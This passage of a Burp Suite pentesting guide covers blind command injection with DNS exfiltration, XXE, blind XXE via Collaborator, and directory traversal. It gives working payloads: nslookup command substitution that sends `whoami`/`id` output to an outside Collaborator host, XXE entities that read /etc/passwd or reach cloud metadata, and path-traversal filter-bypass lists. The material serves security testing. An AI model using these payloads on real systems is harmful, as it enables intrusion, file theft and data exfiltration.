When a blind/asynchronous command injection is confirmed, the question arises: how to obtain the command's output if it does not get into the response? The technique is to "embed" the command's result into the name of a subdomain that the server resolves via DNS, and read it on **Collaborator**. The DNS query carries the subdomain in the clear, so short command output (a username, a hostname) travels to you right in the address.

## Steps

```
1. Find a confirmed (asynchronous) command injection in
   Proxy > HTTP history - right-click > Send to Repeater.
2. Form a payload: an nslookup of a subdomain at the beginning of which
   the command's output is substituted via substitution (backticks or $()).
3. In the Collaborator domain spot right-click >
   Insert Collaborator payload.
4. Send.
5. The Collaborator tab > Poll now.
6. In the table open the interaction and read the subdomain -
   at its beginning will be the command's output. Interactions may
   arrive with a delay (the tab blinks).
```

## A payload example

The key is command substitution inside the host name: the shell will first execute `whoami`, substitute the result, and what gets resolved will be `<output>.<collab>.oastify.com`:

```
& nslookup `whoami`.<collab>.oastify.com &
; nslookup $(whoami).<collab>.oastify.com
| nslookup `id`.<collab>.oastify.com
```

An example request in Repeater:

```http
GET /ping?host=127.0.0.1%26nslookup+%60whoami%60.<collab>.oastify.com%26 HTTP/2
Host: app.example.com
```

In the Collaborator table you will see a DNS query of the kind:

```
DNS  www-data.<collab>.oastify.com
```

where `www-data` is exactly the result of `whoami`.

## Limitations and bypasses

* **Length and characters.** A limited set of characters and a not-very-long string can be put into a DNS name. Spaces and special characters from the output break resolution - they are escaped/stripped, or commands with "clean" single-word output are used.
* **Multi-line output.** `whoami` is one line, convenient. For larger output, encoding/slicing is applied (for example, a pass through `tr`, `cut`, base64 with splitting), but that is already beyond the basic check.
* **DNS vs HTTP.** Exfiltration via DNS works where outbound HTTP is closed - that is its main advantage.

## Practical notes

* **Start with `whoami`/`id`/`hostname`.** Short single-line output is guaranteed to fit into a subdomain and does not break DNS.
* **Substitution is mandatory.** Without backticks/`$()` the server resolves the literal string `whoami.<collab>...`, not the result - check that the substitution actually fires (the output, not the word `whoami`, should end up in the address).
* **Insert Collaborator payload + Poll now** - the standard combination: a unique address and an immediate poll instead of waiting for the cycle.
* **Save the interaction for the report.** A DNS query with your subdomain, where the target's real command output is visible at the beginning, is an exhaustive PoC of RCE with exfiltration.

entries.title: XXE injection (overview)
entries.body:
# XML external entity injection (XXE)

**XXE (XML external entity injection)** is a vulnerability that lets an attacker interfere with the processing of the XML that an application parses. If the XML parser is configured insecurely and processes external entity declarations (`<!ENTITY ... SYSTEM ...>`), an attacker can define their own entity referencing a local file or an external URL, and force the parser to substitute its contents or to go to the address.

## What this gives

* **Reading server files** - the classic: an entity with the value `file:///etc/passwd`, and the file's contents are returned in the response.
* **Interaction with internal/external systems (SSRF)** - an entity with an `http://` address forces the server to make a request; this is how you reach internal services unavailable from outside.
* **Blind XXE / exfiltration via an external channel** - when the entity's contents are not shown in the response, but the parser still goes outward (this is caught by Collaborator).

## Where it occurs

XXE is possible anywhere an application accepts XML: a request body with `Content-Type: application/xml`, SOAP requests, XML file import, XML-based formats (SVG, DOCX/XLSX, RSS), and sometimes even where a JSON endpoint secretly knows how to accept XML when the Content-Type is swapped.

## What you test with in Burp

* **Repeater** - the main tool: insert a `DOCTYPE` declaration with an entity, reference it in an XML value, and look at the response.
* **Collaborator** (Professional) - for **blind XXE**: the entity points to a Collaborator address, the fact of the request confirms the vulnerability.
* **Scanner** (Professional) - automatic searching via an active scan.

Further in two pages: ordinary XXE testing (with data returned in the response) and blind XXE via Collaborator.

entries.title: Testing for XXE
entries.body:
# Testing for XXE

This is about the case where the contents of an external entity are returned in the response - that is, the result is visible directly. The main tool is **Repeater**.

## Steps

```
1. Proxy > HTTP history - find a request whose body contains XML.
2. Right-click > Send to Repeater.
3. At the start of the XML (after the <?xml ...?> line) add a
   DOCTYPE declaration with an external entity referencing a local file.
4. Substitute a reference to your entity (&xxe;) instead of the value
   of one of the XML elements.
5. Send.
6. In the response look for the file's contents (or signs of access to
   a backend system).
7. Check different XML fields and different paths/URLs in the entity.
```

## The basic payload

We define an entity `xxe` with the value of the file `/etc/passwd` and reference it in the document body. Example: the original XML

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```

becomes

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

If the parser is vulnerable, in the response in place of `productId` will be the contents of `/etc/passwd`.

The full request in Repeater:

```http
POST /product/stock HTTP/2
Host: app.example.com
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

## Variations

* **Other files** - change the path in `SYSTEM`: `file:///etc/hostname`, `file:///c:/windows/win.ini`.
* **SSRF via XXE** - instead of a file specify a URL: `SYSTEM "http://169.254.169.254/latest/meta-data/"` (access to internal services/cloud metadata).
* **Different injection points** - substitute `&xxe;` into each element in turn: the vulnerable one may not be the first you come across.
* **Where the output lands** - if the element's value is not reflected in the response directly, there is no place for the return, and then this is the path to blind XXE (see the next page).

## Practical notes

* **`/etc/passwd` as an indicator.** The file exists almost everywhere on Unix and is easily recognizable in the response - ideal for initial confirmation.
* **Put the DOCTYPE before the root element.** The entity declaration must go in the prolog, after `<?xml ...?>` and before the root.
* **Go through the fields.** Returning data is possible only through an element whose value is reflected; try all of them.
* **No return does not mean no XXE.** If the contents are not shown, move on to blind XXE via Collaborator: the parser may still go outward.

entries.title: Blind XXE via Collaborator
entries.body:
# Testing for blind XXE

Blind XXE is XXE in which the value of the external entity is not returned in the response: reading a file "head-on" via reflection does not work. But the parser may still be configured to process external entities - and that means it can be forced to make a request outward. This is confirmed via **Collaborator** (OAST): the entity points to your Collaborator address, and an incoming interaction proves that the parser really resolves external entities.

## Steps

```
1. Proxy > HTTP history - find a request with XML in the body.
2. Right-click > Send to Repeater.
3. Add a DOCTYPE with an external entity whose SYSTEM address
   points to a Collaborator domain.
4. In the address spot right-click > Insert Collaborator payload.
5. Reference the entity (&xxe;) in the value of one of the elements.
6. Send.
7. The Collaborator tab > Poll now - look for a DNS/HTTP interaction
   with your subdomain (the tab blinks on a new event).
8. Check different XML fields.
```

## The basic payload

The entity references a Collaborator address instead of a file:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "https://<collab>.oastify.com"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

where `<collab>.oastify.com` is substituted via **Insert Collaborator payload**. The full request:

```http
POST /product/stock HTTP/2
Host: app.example.com
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "https://<collab>.oastify.com"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

An incoming **DNS** or **HTTP** interaction at Collaborator = the parser went to your address = blind XXE confirmed.

## If a simple entity does not pass

Sometimes an ordinary entity definition is blocked (for example, the parser does not substitute an external entity in this place). Then an external DTD with a parameter entity is used - a technique for cases where you cannot reference inside the document, but can pull in an external DTD:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://<collab>.oastify.com"> %xxe; ]>
<stockCheck><productId>1</productId></stockCheck>
```

For exfiltrating a file's contents via an external channel, a malicious DTD hosted on your own server is used, which reads the file and embeds it into the URL of a request to Collaborator (an advanced blind XXE scenario).

## Why specifically Collaborator

Blind XXE has no visible response by definition. The only reliable signal is that the server, by your entity, initiated an external connection. Even a single **DNS** hit to a unique subdomain proves the vulnerability, and the interaction details (time, IP) go into the PoC.

## Practical notes

* **A simple SYSTEM entity first.** Often this is enough to get an interaction; move on to parameter entities/an external DTD if the direct one did not work.
* **DNS is more sensitive than HTTP.** Outbound HTTP may be closed, while DNS resolution is not; orient first and foremost on the DNS interaction.
* **Insert Collaborator payload + Poll now** - the standard combination: a unique address and an immediate poll.
* **Go through the fields and wait.** The interaction may not arrive right away; do not close the Collaborator tab and poll manually.

entries.title: Directory traversal
entries.body:
# Directory traversal

**Directory traversal** (also known as path traversal) is a vulnerability that lets you read arbitrary files on the server (and sometimes write them too). It arises when an application substitutes user input into a file path without proper validation: by adding `../` sequences, an attacker "exits" the intended directory up the tree and reaches system files like `/etc/passwd`.

## Automatic scan (Professional)

```
1. Proxy > HTTP history - choose a request (often with a parameter
   like filename=, file=, path=, image=).
2. Right-click > Do active scan.
3. The results are in Dashboard > Issues.
```

## Manual fuzzing via Intruder

```
1. Right-click the request in HTTP history > Send to Intruder.
2. Select the value of the parameter with the file name/path and Add §.
3. In the Payloads panel load a list:
   - Pro: the built-in Fuzzing - path traversal;
   - Community: add the strings manually (see below).
4. Start attack.
5. In the results look for responses with a larger length (Length) -
   a sign that the file's contents came back; cross-check
   by the status/body too.
```

## A targeted check in Repeater

For dissection **Repeater** is more convenient (right-click > **Send to Repeater**) - you substitute one variant at a time and look at the response.

The basic payload:

```http
GET /image?filename=../../../../etc/passwd HTTP/2
Host: app.example.com
```

A Windows target:

```
..\..\..\..\windows\win.ini
```

## Filter bypasses

If a naive `../` is cut, you go through variations - this is exactly what the list in Intruder is for:

```
../../../../etc/passwd                     basic
....//....//....//etc/passwd               nested (bypass of ../ stripping)
..%2f..%2f..%2fetc%2fpasswd                URL-encoding of /
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd    encoding of dots and slashes
..%252f..%252f..%252fetc%252fpasswd        double URL-encoding
/etc/passwd                                absolute path (no ../)
../../../../etc/passwd%00.png              null byte (old platforms)
....\\....\\....\\windows\\win.ini          Windows variant of the nested one
```

## Useful payloads for a manual list (Community)

```
../../../../../../etc/passwd
....//....//....//....//etc/passwd
..%2f..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
/etc/passwd
..\..\..\..\windows\win.ini
..%5c..%5c..%5cwindows%5cwin.ini
```

## Practical notes

* **`/etc/passwd` and `win.ini` as markers.** Recognizable contents in the response immediately confirm a file read.
* **Use response length as a guide.** In Intruder sort by **Length**: a successful file read is usually noticeably longer than an "empty" response.
* **Add `../` with a margin.** Extra `../` do no harm (you cannot rise above the root), so take 6-8 levels, to be sure you reach the FS root.
* **Go through the encodings.** If a simple `../` does not pass - try `..%2f`, double encoding `..%252f`, nested `....//`, the absolute path; it is precisely the combination of these techniques that bypasses most naive filters.
